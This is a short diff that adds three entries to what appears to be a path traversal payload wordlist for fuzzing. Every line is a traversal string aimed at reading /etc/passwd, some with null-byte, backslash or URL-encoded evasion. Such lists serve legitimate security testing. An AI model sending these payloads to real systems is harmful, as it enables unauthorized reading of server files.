@@ -1,5 +1,8 @@
+../../../etc/passwd
 ../../../../etc/passwd
+../../../../../etc/passwd
 ../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
 /etc/passwd%00.php
 ....\/....\/....\/etc/passwd
 %5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
